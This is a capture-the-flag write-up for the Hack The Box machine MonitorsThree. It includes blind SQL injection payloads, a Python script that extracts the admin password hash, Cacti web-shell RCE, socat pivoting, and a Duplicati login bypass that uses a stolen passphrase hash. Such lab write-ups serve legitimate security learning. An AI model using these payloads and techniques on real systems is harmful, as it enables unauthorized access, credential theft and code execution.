### Part 1: Enumeration

As always, let’s start with a good old Nmap scan:

![NMAP](/static/writeups/HTB-S-VI/monitors/1.png)

SSH and HTTP with ports 22 and 80 are open. Let's check the website hosted on port 80. I added `monitorsthree.htb` to the machine's IP in `/etc/hosts`:

![NMAP](/static/writeups/HTB-S-VI/monitors/2.png)

The site `monitorsthree.htb` appears. To enumerate subdomains, I created a bash script to add words from a wordlist to `/etc/hosts` and send requests to it:

```
#!/bin/bash

DOMAIN="monitorsthree.htb"
IP="10.10.11.30"
WORDLIST="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"

while read -r SUBDOMAIN; do
    FULLDOMAIN="${SUBDOMAIN}.${DOMAIN}"
    echo "$IP $FULLDOMAIN" >> /etc/hosts
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://$FULLDOMAIN")

    if [ "$RESPONSE" == "302" ]; then
        echo "Found: $FULLDOMAIN"
    fi

    sed -i "/$FULLDOMAIN/d" /etc/hosts
done < "$WORDLIST"
```

I found an interesting subdomain called `cacti.monitorsthree.htb`, but it requires login credentials. There's also a login page at `monitorsthree.htb/login.php`. Using the "forgot password" feature, I found SQL injection in `forgot_password.php` by submitting: `'`

![NMAP](/static/writeups/HTB-S-VI/monitors/3.png)

### Part 2: Foothold

By submitting `'order by 3--+` until an error appears, I could see that it uses MariaDB. Alternatively:

```
ad'union select null,null,null,null,null,null,null,null,null from dual--
```

When querying with nine columns, it says "Successfully sent request code," so we should use nine columns in our SQL queries.

Using:

```
'||(SELECT '' FROM table)||'
```

I triggered an error, revealing `users` as a table name. To enumerate users, I tested the username "administrator":

```
ad' ||((SELECT 'a' FROM users WHERE username='administrator')='a')||'
```

This returned an error, but testing with "admin":

```
ad' ||((SELECT 'a' FROM users WHERE username='admin')='a')||'
```

resulted in a "Successfully sent password reset request!" message.

Now, i know admin username, i used these payload to find the password length:

```
ad' ||((SELECT 'a' FROM users WHERE username='admin' and length(password)=32)='a')||'
```

The password length is 32 characters. To enumerate each password character, I used these queries:

```
ad' ||(SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3'||'
```

```
ad' ||(SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='1'||'
```

I automated this with a Python script:

```
import requests
import time

url = "http://monitorsthree.htb/forgot_password.php"
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def is_correct_char(position, char):
    payload = f"ad' ||((SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{char}')||'"
    data = {"username": payload, "submit": "Send"}

    try:
        response = requests.post(url, data=data)
        if "Successfully sent password reset request!" in response.text:
            return True
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return is_correct_char(position, char)
    return False

known_password = ""
for position in range(1, 33):
    for char in characters:
        if is_correct_char(position, char):
            known_password += char
            print(f"[+] Found character {position}: {char}")
            break
    time.sleep(1)

print(f"[+] Password: {known_password}")
```

The output:

![NMAP](/static/writeups/HTB-S-VI/monitors/6.png)

Using `hashid`, I identified the hash as MD5 and cracked it with hashcat. The password: `greencacti2001`

![NMAP](/static/writeups/HTB-S-VI/monitors/8.png)

Using these credentials in `login.php` and `cacti.monitorsthree.htb`, I noticed `cacti.monitorsthree.htb` uses Cacti v1.2.26, which has a known vulnerability for arbitrary file write leading to RCE.

I used:

```
<?php

$xmldata = "<xml>...</xml>";
...
?>
```

This generated `shell.xml.gz`. Uploading it in the Cacti import packages led to a successful upload of `shell.php`. Accessing `http://cacti.monitorsthree.htb/cacti/resource/shell.php` provided a shell as `www-data`.

### Part 3: User and root:

finally, getting shell as www_data, i begin to enumerate system and found out it was using duplicati as i fouund folder called duplicati in `/opt` directory and a user called marcus via /etc/passwd.
Using ss -tnlp i found out duplicati is running in port 8200, port forwarding it using Socat:

```
In monitorsthree shell
socat TCP-LISTEN:1337,fork TCP:localhost:8200

In host machine
socat TCP-LISTEN:8200,fork TCP:monitorsthree_IP:1337
```

Now, i can visit site in port 8200 in our machine, going there we are directed into login.html where it asks for password. Trying default duplicati password like 'DUPLICATI,duplicati,Duplicate' doesnot seem to work. Remember i found duplicati folder earlier, looking files recursively in that folder i found a file called `Duplicati-server.sqlite` in `/opt/duplicati/config/` which i can read using `strings`.
I found interesting hash in there:

![NMAP](/static/writeups/HTB-S-VI/monitors/10.png)

Using those hashes directly lead me nowhere so, after researching for a while i found a way to login with this process:
open up burpsuite and intercept the traffic, after submitting password we can see it creates nonce value and salt. notice that salt it gives in response and salt found in that duplicati file are same.

![NMAP](/static/writeups/HTB-S-VI/monitors/11.png)

But, nonce is different each time we login, and in burp http-history notice it executes javascript for converting password into hash value

![NMAP](/static/writeups/HTB-S-VI/monitors/12.png)

```
var saltedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Utf8.parse($('#login-password').val()) + CryptoJS.enc.Base64.parse(data.Salt)));
```

This `$('#login-password').val()` gets the entered password and concatenates it with the base64 decoded salt obtained from the server earlier using `CryptoJS.enc.Base64.parse`, then it is passed to the `CryptoJS.enc.Utf8.parse` function.

which returns the hexadecimal representation and then decodes that value with `CryptoJS.enc.Hex.parse` and performs a SHA256 of the raw content.

Then creates the variable `noncedpwd` using `saltedpwd` and the nonce.

```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
```

Now run 'server-passphrase' hash found earlier in cyberchef using `From base64 and TO HEX`, this is our saltedpwd

![NMAP](/static/writeups/HTB-S-VI/monitors/13.png)

before creating password hash, we must adjust our time same as of monitorsthree machine because some token implementation is related to it. monitorsthree is using timezone `Etc/UTC` so, in your host machine use set `timedatectl set-timezone Etc/UTC`

Remember in each login it creates new nonce that we are able to use in that request only so intercept the request using burp and copy the URL decode the nonce value obtain via session-nonce in burp decoder.

![NMAP](/static/writeups/HTB-S-VI/monitors/14.png)

use it in noncedpwd with saltedpwdrunnning:

```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
```

![NMAP](/static/writeups/HTB-S-VI/monitors/15.png)
Now url encode password hash using `CTRL + U` in burp and use it in previously intercepted login request:

![NMAP](/static/writeups/HTB-S-VI/monitors/16.png)

and got directed to Duplicati panel

![NMAP](/static/writeups/HTB-S-VI/monitors/17.png)

now, create two folder in /tmp directory eg: fat and dat and go in add backup and setup the backup choose backup destination as `/source/tmp/dat` and source data as `/source/home/marcus/` then run it.

Notice three different file in `/tmp/dat` as it succed now in restore tab select that backup and select user.txt in select files and `/source/tmp/fat/` as restore destination, now i can see all file from `/home/marcus/` present in `/tmp/fat` and got user flag:

![NMAP](/static/writeups/HTB-S-VI/monitors/18.png)

using similar technique for root flag which is located in `/root/root.txt` i got root flag:

![NMAP](/static/writeups/HTB-S-VI/monitors/19.png)

### Conclusion

This challenging machine taught me a lot!
